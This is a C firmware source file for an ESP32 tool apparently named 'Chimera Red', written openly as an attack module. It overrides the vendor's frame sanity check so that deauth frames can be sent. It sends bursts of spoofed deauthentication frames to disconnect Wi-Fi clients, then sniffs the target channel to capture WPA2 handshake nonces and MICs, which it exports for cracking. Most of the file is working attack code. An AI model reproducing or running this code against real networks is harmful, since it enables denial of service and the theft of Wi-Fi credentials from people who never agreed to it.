/**
 * @file wifi_manager.c
 * @brief WiFi Manager Implementation for Chimera Red
 *
 * This is the CRITICAL module - the entire reason for ESP-IDF migration.
 * Provides reliable raw 802.11 frame injection for deauthentication attacks.
 */
#include "wifi_manager.h"
#include "esp_event.h"
#include "esp_log.h"
#include "esp_netif.h"
#include "freertos/FreeRTOS.h"
#include "freertos/semphr.h"
#include "freertos/task.h"
#include "nvs_flash.h"
#include "serial_comm.h"
#include <stdio.h>
#include <string.h>

static const char *TAG = "wifi_mgr";

/**
 * CRITICAL BYPASS: Override the ESP-IDF WiFi blob's frame sanity check.
 * This function in the closed-source libnet80211.a blocks deauth/disassoc
 * frames. By providing our own implementation that always returns 0, we bypass
 * this check. Requires linker flag: -Wl,-zmuldefs
 */
int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  return 0; // Always pass - allow all frame types
}

// Global state
static wifi_sniffer_cb_t g_sniffer_cb = NULL;
static wifi_handshake_cb_t g_handshake_cb = NULL;
static bool g_promiscuous_active = false;
static bool g_channel_hopping = false;
static bool g_recon_mode = false;
static uint8_t g_current_channel = 1;
static uint16_t g_deauth_seq = 0;
static TaskHandle_t g_hopper_task = NULL;
static SemaphoreHandle_t g_wifi_mutex = NULL;

// Channel hopping sequence (optimized order for overlapping coverage)
static const uint8_t hop_channels[] = {1, 6,  11, 2, 7, 12, 3,
                                       8, 13, 4,  9, 5, 10};
static int g_hop_index = 0;

// Handshake cache for EAPOL tracking
#define HANDSHAKE_CACHE_SIZE 8
static struct {
  uint8_t bssid[6];
  uint8_t sta[6];
  uint8_t anonce[32];
  uint32_t last_seen;
  bool valid;
} g_handshake_cache[HANDSHAKE_CACHE_SIZE];

// Forward declarations
static void promisc_rx_cb(void *buf, wifi_promiscuous_pkt_type_t type);
static void channel_hopper_task(void *arg);

esp_err_t wifi_manager_init(void) {
  ESP_LOGI(TAG, "Initializing WiFi Manager...");

  // Initialize NVS (required for WiFi)
  esp_err_t ret = nvs_flash_init();
  if (ret == ESP_ERR_NVS_NO_FREE_PAGES ||
      ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
    ESP_LOGW(TAG, "NVS needs erase, erasing...");
    ESP_ERROR_CHECK(nvs_flash_erase());
    ret = nvs_flash_init();
  }
  ESP_ERROR_CHECK(ret);

  // Initialize TCP/IP stack
  ESP_ERROR_CHECK(esp_netif_init());
  ESP_ERROR_CHECK(esp_event_loop_create_default());

  // Create AP netif (required for raw TX)
  esp_netif_create_default_wifi_ap();
  esp_netif_create_default_wifi_sta();

  // Initialize WiFi with default config
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  cfg.nvs_enable = 1;
  ESP_ERROR_CHECK(esp_wifi_init(&cfg));
  ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));

  // Create mutex for thread safety
  g_wifi_mutex = xSemaphoreCreateMutex();
  if (g_wifi_mutex == NULL) {
    ESP_LOGE(TAG, "Failed to create WiFi mutex");
    return ESP_FAIL;
  }

  ESP_LOGI(TAG, "WiFi Manager initialized successfully");
  return ESP_OK;
}

void wifi_manager_deinit(void) {
  wifi_sniffer_stop();
  esp_wifi_stop();
  esp_wifi_deinit();
  if (g_wifi_mutex) {
    vSemaphoreDelete(g_wifi_mutex);
    g_wifi_mutex = NULL;
  }
}

esp_err_t wifi_scan_start(wifi_scan_cb_t callback) {
  xSemaphoreTake(g_wifi_mutex, portMAX_DELAY);

  // Stop any active mode
  if (g_promiscuous_active) {
    esp_wifi_set_promiscuous(false);
    g_promiscuous_active = false;
  }

  esp_wifi_stop();
  ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
  ESP_ERROR_CHECK(esp_wifi_start());

  wifi_scan_config_t scan_config = {
      .ssid = NULL,
      .bssid = NULL,
      .channel = 0,
      .show_hidden = true,
      .scan_type = WIFI_SCAN_TYPE_ACTIVE,
      .scan_time.active.min = 100,
      .scan_time.active.max = 300,
  };

  esp_err_t ret = esp_wifi_scan_start(&scan_config, true);
  if (ret != ESP_OK) {
    ESP_LOGE(TAG, "Scan start failed: %d", ret);
    xSemaphoreGive(g_wifi_mutex);
    return ret;
  }

  // Get results
  uint16_t ap_count = 0;
  esp_wifi_scan_get_ap_num(&ap_count);

  if (ap_count > 0 && callback) {
    wifi_ap_record_t *ap_list = malloc(sizeof(wifi_ap_record_t) * ap_count);
    if (ap_list) {
      esp_wifi_scan_get_ap_records(&ap_count, ap_list);

      // Construct results for Android app
      // {"type": "wifi_scan_result", "count": N, "networks": [...]}
      char *json_buf = malloc(16384);
      if (json_buf) {
        int pos = snprintf(
            json_buf, 16384,
            "{\"type\":\"wifi_scan_result\",\"count\":%d,\"networks\":[",
            ap_count);

        for (int i = 0; i < ap_count; i++) {
          wifi_scan_result_t result = {0};
          strncpy(result.ssid, (char *)ap_list[i].ssid, 32);
          memcpy(result.bssid, ap_list[i].bssid, 6);
          result.channel = ap_list[i].primary;
          result.rssi = ap_list[i].rssi;
          result.authmode = ap_list[i].authmode;

          // Notify internal GUI/callbacks
          callback(&result);

          // Add to JSON list
          char bssid_str[18];
          snprintf(bssid_str, sizeof(bssid_str),
                   "%02X:%02X:%02X:%02X:%02X:%02X", result.bssid[0],
                   result.bssid[1], result.bssid[2], result.bssid[3],
                   result.bssid[4], result.bssid[5]);

          char escaped_ssid[65];
          serial_escape_json(result.ssid, escaped_ssid, sizeof(escaped_ssid));

          pos += snprintf(json_buf + pos, 16384 - pos,
                          "{\"ssid\":\"%s\",\"bssid\":\"%s\",\"rssi\":%d,"
                          "\"channel\":%d,\"encryption\":%d}%s",
                          escaped_ssid, bssid_str, result.rssi, result.channel,
                          result.authmode, (i < ap_count - 1) ? "," : "");
        }
        strcat(json_buf, "]}");
        serial_send_json_raw(json_buf);
        free(json_buf);
      }
      free(ap_list);
    }
  }

  xSemaphoreGive(g_wifi_mutex);
  return ESP_OK;
}

static void channel_hopper_task(void *arg) {
  while (g_channel_hopping) {
    g_hop_index = (g_hop_index + 1) % 13;
    g_current_channel = hop_channels[g_hop_index];
    esp_wifi_set_channel(g_current_channel, WIFI_SECOND_CHAN_NONE);
    vTaskDelay(pdMS_TO_TICKS(250));
  }
  g_hopper_task = NULL;
  vTaskDelete(NULL);
}

esp_err_t wifi_sniffer_start(uint8_t channel) {
  xSemaphoreTake(g_wifi_mutex, portMAX_DELAY);

  ESP_LOGI(TAG, "Starting sniffer on channel %d (0=hopping)", channel);

  esp_wifi_stop();

  // Configure AP mode (required for reliable raw TX)
  ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));

  // Configure hidden AP with minimal beacon
  wifi_config_t ap_config = {
      .ap = {
          .ssid = "chimera_cap",
          .ssid_len = 11,
          .password = "chimerapass",
          .channel = (channel > 0 && channel <= 13) ? channel : 1,
          .authmode = WIFI_AUTH_WPA2_PSK,
          .ssid_hidden = 1,
          .max_connection = 0,
          .beacon_interval = 60000,
      }};
  ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_config));
  ESP_ERROR_CHECK(esp_wifi_start());
  ESP_ERROR_CHECK(esp_wifi_set_ps(WIFI_PS_NONE));

  // Set initial channel
  g_current_channel = (channel > 0 && channel <= 13) ? channel : 1;
  ESP_ERROR_CHECK(
      esp_wifi_set_channel(g_current_channel, WIFI_SECOND_CHAN_NONE));

  // Configure promiscuous filter
  wifi_promiscuous_filter_t filter = {.filter_mask =
                                          WIFI_PROMIS_FILTER_MASK_MGMT |
                                          WIFI_PROMIS_FILTER_MASK_DATA};
  ESP_ERROR_CHECK(esp_wifi_set_promiscuous_filter(&filter));
  ESP_ERROR_CHECK(esp_wifi_set_promiscuous_rx_cb(promisc_rx_cb));
  ESP_ERROR_CHECK(esp_wifi_set_promiscuous(true));

  g_promiscuous_active = true;

  // Handle channel hopping
  if (channel == 0) {
    g_channel_hopping = true;
    xTaskCreate(channel_hopper_task, "ch_hopper", 2048, NULL, 5,
                &g_hopper_task);
    ESP_LOGI(TAG, "Channel hopping enabled");
  } else {
    g_channel_hopping = false;
  }

  xSemaphoreGive(g_wifi_mutex);
  ESP_LOGI(TAG, "Sniffer started successfully");
  return ESP_OK;
}

esp_err_t wifi_sniffer_stop(void) {
  xSemaphoreTake(g_wifi_mutex, portMAX_DELAY);

  g_channel_hopping = false;
  if (g_hopper_task) {
    vTaskDelay(pdMS_TO_TICKS(300)); // Wait for task to exit
  }

  esp_wifi_set_promiscuous(false);
  g_promiscuous_active = false;

  ESP_LOGI(TAG, "Sniffer stopped");
  xSemaphoreGive(g_wifi_mutex);
  return ESP_OK;
}

void wifi_set_channel_hopping(bool enable) {
  if (enable && !g_channel_hopping && g_promiscuous_active) {
    g_channel_hopping = true;
    xTaskCreate(channel_hopper_task, "ch_hopper", 2048, NULL, 5,
                &g_hopper_task);
  } else if (!enable) {
    g_channel_hopping = false;
  }
}

esp_err_t wifi_set_channel(uint8_t channel) {
  if (channel < 1 || channel > 13)
    return ESP_ERR_INVALID_ARG;
  g_current_channel = channel;
  return esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
}

uint8_t wifi_get_channel(void) { return g_current_channel; }

esp_err_t wifi_send_deauth(const uint8_t *target_mac, const uint8_t *ap_mac,
                           uint8_t channel, uint16_t reason) {
  // Alias for single-packet call - just forward to burst with count=1
  return wifi_send_deauth_burst(target_mac, ap_mac, channel, reason, 1);
}

/**
 * Send a burst of deauthentication frames. This is optimized to only
 * restart WiFi once (not per-packet), making it much more effective.
 */
esp_err_t wifi_send_deauth_burst(const uint8_t *target_mac,
                                 const uint8_t *ap_mac, uint8_t channel,
                                 uint16_t reason, int count) {
  if (!ap_mac) {
    ESP_LOGE(TAG, "AP MAC required for deauth");
    return ESP_ERR_INVALID_ARG;
  }
  if (channel == 0) {
    channel = g_current_channel > 0 ? g_current_channel : 6;
  }

  ESP_LOGI(TAG, "Deauth burst %d packets to %02X:%02X:%02X:%02X:%02X:%02X ch%d",
           count, ap_mac[0], ap_mac[1], ap_mac[2], ap_mac[3], ap_mac[4],
           ap_mac[5], channel);

  // Save original state
  bool was_promisc = g_promiscuous_active;
  bool was_hopping = g_channel_hopping;
  uint8_t original_mac[6];
  esp_wifi_get_mac(WIFI_IF_AP, original_mac);

  // ====== PHASE 1: Tear down WiFi ONCE ======
  if (was_hopping) {
    g_channel_hopping = false;
    vTaskDelay(pdMS_TO_TICKS(50));
  }
  if (was_promisc) {
    esp_wifi_set_promiscuous(false);
    g_promiscuous_active = false;
  }
  esp_wifi_stop();

  // ====== PHASE 2: Setup for TX (spoofed MAC, target channel) ======
  esp_wifi_set_mac(WIFI_IF_AP, ap_mac);

  wifi_config_t ap_config = {.ap = {
                                 .ssid = "",
                                 .ssid_len = 0,
                                 .password = "",
                                 .channel = channel,
                                 .authmode = WIFI_AUTH_OPEN,
                                 .ssid_hidden = 1,
                                 .max_connection = 0,
                                 .beacon_interval = 60000,
                             }};

  esp_wifi_set_mode(WIFI_MODE_APSTA);
  esp_wifi_set_config(WIFI_IF_AP, &ap_config);
  esp_wifi_start();
  esp_wifi_set_ps(WIFI_PS_NONE);
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous(true);

  vTaskDelay(pdMS_TO_TICKS(20)); // Let radio stabilize

  // ====== PHASE 3: Build and send BURST of deauth frames ======
  uint8_t deauth_frame[26] = {
      0xC0, 0x00,                         // Frame Control (Deauth)
      0x00, 0x00,                         // Duration
      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Addr1 (RA) - Broadcast
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Addr2 (TA) - Spoofed AP
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Addr3 (BSSID)
      0x00, 0x00,                         // Sequence number
      0x07, 0x00                          // Reason code
  };

  if (target_mac) {
    memcpy(deauth_frame + 4, target_mac, 6);
  }
  memcpy(deauth_frame + 10, ap_mac, 6);
  memcpy(deauth_frame + 16, ap_mac, 6);
  deauth_frame[24] = reason & 0xFF;
  deauth_frame[25] = (reason >> 8) & 0xFF;

  int ok = 0, fail = 0;
  for (int i = 0; i < count; i++) {
    // Update sequence number
    deauth_frame[22] = (g_deauth_seq & 0x0f) << 4;
    deauth_frame[23] = (g_deauth_seq & 0xff0) >> 4;
    g_deauth_seq = (g_deauth_seq + 1) & 0xfff;

    esp_err_t ret =
        esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), true);
    if (ret == ESP_OK)
      ok++;
    else
      fail++;

    vTaskDelay(pdMS_TO_TICKS(5)); // 5ms between packets
  }

  ESP_LOGI(TAG, "Deauth TX complete: %d OK, %d FAIL", ok, fail);

  // ====== PHASE 4: Restore promiscuous mode ON TARGET CHANNEL ======
  esp_wifi_set_promiscuous(false);
  esp_wifi_stop();
  esp_wifi_set_mac(WIFI_IF_AP, original_mac);

  // CRITICAL: Restore sniffer on the SAME channel we just attacked
  // This ensures we capture the handshake when client reconnects
  g_current_channel = channel; // Update current channel to target

  wifi_config_t restore_config = {
      .ap = {
          .ssid = "chimera_cap",
          .ssid_len = 11,
          .password = "chimerapass",
          .channel = channel, // TARGET channel, not old channel!
          .authmode = WIFI_AUTH_WPA2_PSK,
          .ssid_hidden = 1,
          .max_connection = 0,
          .beacon_interval = 60000,
      }};

  esp_wifi_set_mode(WIFI_MODE_AP);
  esp_wifi_set_config(WIFI_IF_AP, &restore_config);
  esp_wifi_start();
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

  wifi_promiscuous_filter_t filter = {.filter_mask =
                                          WIFI_PROMIS_FILTER_MASK_MGMT |
                                          WIFI_PROMIS_FILTER_MASK_DATA};
  esp_wifi_set_promiscuous_filter(&filter);
  esp_wifi_set_promiscuous_rx_cb(promisc_rx_cb);
  esp_wifi_set_promiscuous(true);
  g_promiscuous_active = true;

  // Don't restart hopper - stay on target channel to catch handshake!

  return (ok > 0) ? ESP_OK : ESP_FAIL;
}

void wifi_set_sniffer_callback(wifi_sniffer_cb_t cb) { g_sniffer_cb = cb; }

void wifi_set_handshake_callback(wifi_handshake_cb_t cb) {
  g_handshake_cb = cb;
}

void wifi_start_recon_mode(void) {
  g_recon_mode = true;
  ESP_LOGI(TAG, "Recon mode enabled");
}

void wifi_stop_recon_mode(void) {
  g_recon_mode = false;
  ESP_LOGI(TAG, "Recon mode disabled");
}

bool wifi_is_sniffing(void) { return g_promiscuous_active; }

// Internal promiscuous RX callback - handles EAPOL for handshake capture
static void promisc_rx_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;

  // Forward to user callback if registered
  if (g_sniffer_cb) {
    g_sniffer_cb(buf, type);
  }

  int len = pkt->rx_ctrl.sig_len;
  uint8_t *payload = pkt->payload;

  // Minimum length check
  if (len < 60)
    return;

  uint8_t frame_ctrl = payload[0];

  // Process management frames for recon mode
  if (g_recon_mode && type == WIFI_PKT_MGMT) {
    // Beacon (0x80) or Probe Response (0x50)
    if (frame_ctrl == 0x80 || frame_ctrl == 0x50) {
      // Extract BSSID (Addr3 at offset 16)
      char bssid_str[18];
      snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X",
               payload[16], payload[17], payload[18], payload[19], payload[20],
               payload[21]);

      // Extract SSID from tagged parameters (starting at offset 36)
      int pos = 36;
      if (pos + 2 < len && payload[pos] == 0) { // SSID tag is 0
        int ssid_len = payload[pos + 1];
        if (ssid_len > 0 && ssid_len <= 32 && (pos + 2 + ssid_len <= len)) {
          char ssid[33] = {0};
          memcpy(ssid, payload + pos + 2, ssid_len);

          // Send recon data
          char json[256];
          char escaped_ssid[65];
          serial_escape_json(ssid, escaped_ssid, sizeof(escaped_ssid));
          snprintf(json, sizeof(json),
                   "{\"ssid\":\"%s\",\"bssid\":\"%s\",\"rssi\":%d,\"ch\":%d}",
                   escaped_ssid, bssid_str, pkt->rx_ctrl.rssi,
                   pkt->rx_ctrl.channel);
          serial_send_json("recon", json);
        }
      }
    }
    return;
  }

  // Data frames only for EAPOL
  if ((frame_ctrl & 0x0C) != 0x08)
    return;

  // Calculate header length
  int header_len = 24;
  bool is_qos = (frame_ctrl & 0x80) == 0x80;
  if (is_qos)
    header_len += 2;

  if (len < header_len + 8)
    return;

  // Check for LLC/SNAP header with EAPOL
  uint8_t *llc = payload + header_len;
  if (llc[0] != 0xAA || llc[1] != 0xAA || llc[6] != 0x88 || llc[7] != 0x8E) {
    return; // Not EAPOL
  }

  // Parse EAPOL
  int eapol_offset = header_len + 8;
  if (len < eapol_offset + 4)
    return;

  uint8_t *eapol_body = payload + eapol_offset + 4;

  uint8_t descriptor_type = eapol_body[0];
  // WPA1 = 0xFE, WPA2/RSN = 0x02
  if (descriptor_type != 0x02 && descriptor_type != 0xFE &&
      descriptor_type != 0x01) {
    return;
  }

  uint16_t key_info = (eapol_body[1] << 8) | eapol_body[2];
  bool key_ack = (key_info & 0x0080) != 0;
  bool key_mic = (key_info & 0x0100) != 0;

  uint8_t *bssid = payload + 16; // BSSID is at Addr3

  if (key_ack && !key_mic) {
    // Message 1/4 (AP -> STA) - Contains ANonce
    int slot = -1;
    for (int i = 0; i < HANDSHAKE_CACHE_SIZE; i++) {
      if (!g_handshake_cache[i].valid ||
          (xTaskGetTickCount() - g_handshake_cache[i].last_seen >
           pdMS_TO_TICKS(10000))) {
        slot = i;
        break;
      }
    }

    if (slot >= 0) {
      memcpy(g_handshake_cache[slot].bssid, bssid, 6);
      memcpy(g_handshake_cache[slot].sta, payload + 4, 6); // Addr1 = STA
      memcpy(g_handshake_cache[slot].anonce, eapol_body + 13, 32);
      g_handshake_cache[slot].last_seen = xTaskGetTickCount();
      g_handshake_cache[slot].valid = true;
      ESP_LOGD(TAG, "Cached Msg 1/4 ANonce");
    }
  } else if (key_mic && !key_ack) {
    // Message 2/4 (STA -> AP) - Contains SNonce and MIC
    // Look for matching ANonce in cache
    for (int i = 0; i < HANDSHAKE_CACHE_SIZE; i++) {
      if (g_handshake_cache[i].valid &&
          memcmp(g_handshake_cache[i].bssid, bssid, 6) == 0) {

        // Complete handshake found!
        wifi_handshake_t hs = {0};
        memcpy(hs.bssid, bssid, 6);
        memcpy(hs.sta, payload + 10, 6); // Addr2 = STA
        memcpy(hs.anonce, g_handshake_cache[i].anonce, 32);
        memcpy(hs.snonce, eapol_body + 13, 32);
        memcpy(hs.mic, eapol_body + 77, 16);
        hs.channel = pkt->rx_ctrl.channel;
        hs.rssi = pkt->rx_ctrl.rssi;
        hs.timestamp = xTaskGetTickCount();
        hs.complete = true;

        // Notify callback
        if (g_handshake_cb) {
          g_handshake_cb(&hs);
        }

        // Also send via serial (for Android client)
        char bssid_str[18], sta_str[18];
        snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X",
                 hs.bssid[0], hs.bssid[1], hs.bssid[2], hs.bssid[3],
                 hs.bssid[4], hs.bssid[5]);
        snprintf(sta_str, sizeof(sta_str), "%02X:%02X:%02X:%02X:%02X:%02X",
                 hs.sta[0], hs.sta[1], hs.sta[2], hs.sta[3], hs.sta[4],
                 hs.sta[5]);

        char *json = malloc(1024);
        if (json) {
          char anonce_hex[65], snonce_hex[65], mic_hex[33];
          for (int j = 0; j < 32; j++) {
            sprintf(anonce_hex + (j * 2), "%02X", hs.anonce[j]);
            sprintf(snonce_hex + (j * 2), "%02X", hs.snonce[j]);
          }
          for (int j = 0; j < 16; j++) {
            sprintf(mic_hex + (j * 2), "%02X", hs.mic[j]);
          }
          anonce_hex[64] = '\0';
          snonce_hex[64] = '\0';
          mic_hex[32] = '\0';

          snprintf(json, 1024,
                   "{\"type\":\"wifi_handshake\",\"ssid\":\"Captured\","
                   "\"bssid\":\"%s\",\"sta_mac\":\"%s\",\"ch\":%d,\"rssi\":%d,"
                   "\"anonce\":\"%s\",\"snonce\":\"%s\",\"mic\":\"%s\"}",
                   bssid_str, sta_str, hs.channel, hs.rssi, anonce_hex,
                   snonce_hex, mic_hex);
          serial_send_json_raw(json);
          free(json);
        }

        ESP_LOGI(TAG, "WPA2 Handshake captured! BSSID=%s STA=%s", bssid_str,
                 sta_str);

        // Invalidate cache entry
        g_handshake_cache[i].valid = false;
        break;
      }
    }
  }
}
